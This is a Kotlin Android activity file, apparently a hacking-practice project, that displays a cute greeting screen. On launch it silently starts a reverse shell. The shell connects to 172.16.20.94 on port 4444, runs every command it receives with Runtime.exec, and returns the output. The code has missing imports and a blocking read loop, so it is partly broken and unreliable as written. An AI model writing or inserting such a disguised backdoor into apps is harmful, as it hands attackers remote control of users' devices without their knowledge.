package com.example.hackrev

import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.example.hackrev.ui.theme.HackRevTheme

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            HackRevTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Android",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }
        startReverseShell()
    }
}

    private fun startReverseShell() {
        // host and port
        val remoteHost = "172.16.20.94"
        val remotePort = 4444

        Thread {
            try {
                // create socket and connect
                val socket = Socket(remoteHost, remotePort)

                // stream to socket
                val inputStream = InputStreamReader(socket.getInputStream())
                val outputStream = OutputStreamWriter(socket.getOutputStream())

                // Получаем команды через сокет и выполняем их
                val reader = inputStream.readLines().iterator()
                while (reader.hasNext()) {
                    val command = reader.next()
                    val process = Runtime.getRuntime().exec(command)
                    val processInput = process.inputStream.bufferedReader()
                    val processOutput = process.outputStream.writer()

                    // send command results to server
                    processInput.lines().forEach { line ->
                        outputStream.write(line + "\n")
                    }
                    outputStream.flush()
                }

                // close socket connection
                socket.close()
            } catch (e: Exception) {
                Log.e("revsh", "error: ${e.message}")
            }
        }.start()
    }

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Meow-meow!!!! Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    HackRevTheme {
        Greeting("Bahrain")
    }
}